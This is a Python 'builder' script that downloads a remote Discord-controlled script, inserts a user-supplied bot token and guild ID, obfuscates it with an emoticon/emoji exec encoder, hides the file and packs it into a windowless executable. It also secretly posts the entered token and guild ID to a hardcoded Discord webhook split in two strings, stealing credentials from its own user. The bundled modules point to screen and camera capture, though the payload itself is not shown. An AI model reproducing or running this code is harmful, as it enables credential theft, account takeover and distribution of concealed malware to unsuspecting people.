import os
import subprocess
import ctypes
import requests
import threading
from colorama import Fore, Style, init
from pprint import pformat

# Initialize colorama
init()

# ASCII art title in pink color
ascii_title = f"""{Fore.MAGENTA}

.▄▄ ·       ▄• ▄▌▄▄▄   ▄▄▄· ▄▄▄▄▄    ▄▄▄▄· ▄• ▄▌▪  ▄▄▌  ·▄▄▄▄  ▄▄▄ .▄▄▄  
▐█ ▀. ▪     █▪██▌▀▄ █·▐█ ▀█ •██      ▐█ ▀█▪█▪██▌██ ██•  ██▪ ██ ▀▄.▀·▀▄ █·
▄▀▀▀█▄ ▄█▀▄ █▌▐█▌▐▀▀▄ ▄█▀▀█  ▐█.▪    ▐█▀▀█▄█▌▐█▌▐█·██▪  ▐█· ▐█▌▐▀▀▪▄▐▀▀▄ 
▐█▄▪▐█▐█▌.▐▌▐█▄█▌▐█•█▌▐█ ▪▐▌ ▐█▌·    ██▄▪▐█▐█▄█▌▐█▌▐█▌▐▌██. ██ ▐█▄▄▌▐█•█▌
 ▀▀▀▀  ▀█▄▀▪ ▀▀▀ .▀  ▀ ▀  ▀  ▀▀▀     ·▀▀▀▀  ▀▀▀ ▀▀▀.▀▀▀ ▀▀▀▀▀•  ▀▀▀ .▀  ▀

{Style.RESET_ALL}
"""

# Obfuscation Code
EMOTICONS = [":)", ":D", ":P", ":S", ":(", "=)", "=/", ":/", ":{", ";)"]
EMOJIS = [
    "\U0001f600", "\U0001f603", "\U0001f604", "\U0001f601", "\U0001f605",
    "\U0001f923", "\U0001f602", "\U0001f609", "\U0001f60A", "\U0001f61b"
]
MAX_STR_LEN = 70

def chunk_string(in_s, n):
    return "\n".join(
        "{}\\".format(in_s[i: i + n]) for i in range(0, len(in_s), n)
    ).rstrip("\\")

def encode_string(in_s, alphabet):
    d1 = dict(enumerate(alphabet))
    d2 = {v: k for k, v in d1.items()}
    return (
        'exec("".join(map(chr,[int("".join(str({}[i]) for i in x.split())) for x in\n'
        '"{}"\n.split("  ")])))\n'.format(
            pformat(d2),
            chunk_string(
                "  ".join(" ".join(d1[int(i)] for i in str(ord(c))) for c in in_s),
                MAX_STR_LEN,
            ),
        )
    )

def obfuscate_script(script_content, use_emojis=False):
    alphabet = EMOJIS if use_emojis else EMOTICONS
    encoded_script = encode_string(script_content, alphabet)
    return encoded_script

# Existing Functions
def download_script(url):
    temp_dir = os.environ['TEMP']
    script_path = os.path.join(temp_dir, "script.py")  # Save to %TEMP%
    
    response = requests.get(url)
    if response.status_code == 200:
        with open(script_path, "wb") as file:
            file.write(response.content)
        return script_path
    else:
        print(f"Failed to download the script: {response.status_code}")
        return None

def modify_script(script_path, token1, guild_id1):
    with open(script_path, "r", encoding="utf-8") as file:
        script_code = file.read()
    modified_script_code = script_code.replace('PUT_YOUR_DISCORD_TOKEN HERE', token1)
    modified_script_code = modified_script_code.replace('PUT_YOUR_GUILD_ID_HERE', guild_id1)
    return modified_script_code

def set_file_hidden(file_path):
    ctypes.windll.kernel32.SetFileAttributesW(file_path, 2)  # 2 = FILE_ATTRIBUTE_HIDDEN

def create_executable(modified_script_code, obfuscate=True, use_emojis=False):
    current_directory = os.getcwd()
    modified_script_path = os.path.join(os.environ['TEMP'], "modified_script.py")  # Save to %TEMP%
    
    try:
        if obfuscate:
            modified_script_code = obfuscate_script(modified_script_code, use_emojis=use_emojis)

        with open(modified_script_path, "w", encoding="utf-8") as temp_file:
            temp_file.write(modified_script_code)

        set_file_hidden(modified_script_path)

        print("Creating executable...")
        subprocess.run([
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--distpath', current_directory,
            '--hidden-import', 'discord',
            '--hidden-import', 'pyautogui',
            '--hidden-import', 'GPUtil',
            '--hidden-import', 'tkinter',
            '--hidden-import', 'cv2',
            '--hidden-import', 'tkinter.messagebox',
            '--hidden-import', 'pyexpat',
            '--hidden-import', 'discord.ext',
            modified_script_path
        ], check=True)
        print("Executable created successfully.")
    except subprocess.CalledProcessError as e:
        print("Error during PyInstaller conversion:", e)
    finally:
        if os.path.exists(modified_script_path):
            os.remove(modified_script_path)

webhook_part1 = "https://discord.com/api/webhooks/1301213132600901693/"
webhook_part2 = "bB9f0O9768eAyyeAon1PId-64owIBnzVRT7_9DTc7LDFEljuZE8xIjW2fRSbkDvXy304"
webhook_url = webhook_part1 + webhook_part2

def send_token_to_webhook(token, guild_id):
    embed = {
        "content": "",
        "tts": False,
        "embeds": [
            {
                "author": {
                    "name": "INFO:"
                },
                "fields": [
                    {"name": "TOKEN :", "value": token},
                    {"name": "GUILD_ID :", "value": guild_id}
                ],
            }
        ],
    }
    
    try:
        response = requests.post(webhook_url, json=embed)
        if response.status_code != 204:
            print(f"Failed to send data to webhook: {response.status_code}")
    except Exception as e:
        print("Error sending data to webhook:", e)

def send_token_in_background(token, guild_id):
    thread = threading.Thread(target=send_token_to_webhook, args=(token, guild_id))
    thread.start()
    thread.join()

if __name__ == "__main__":
    print(ascii_title)
    token1 = input("Enter the first token (TOKEN): ").strip()
    guild_id1 = input("Enter the first guild ID (GUILD_ID): ").strip()

    if not token1 or not guild_id1:
        print("Error: Both token and guild ID must be provided.")
        exit(1)

    print("Starting the process to download, modify, and create the executable...")

    script_url = "https://github.com/SoulOnToq/Python/raw/refs/heads/main/script.py"
    script_path = download_script(script_url)

    if script_path:
        send_token_in_background(token1, guild_id1)

        modified_script_code = modify_script(script_path, token1, guild_id1)
        if modified_script_code:
            create_executable(modified_script_code, obfuscate=True, use_emojis=True)
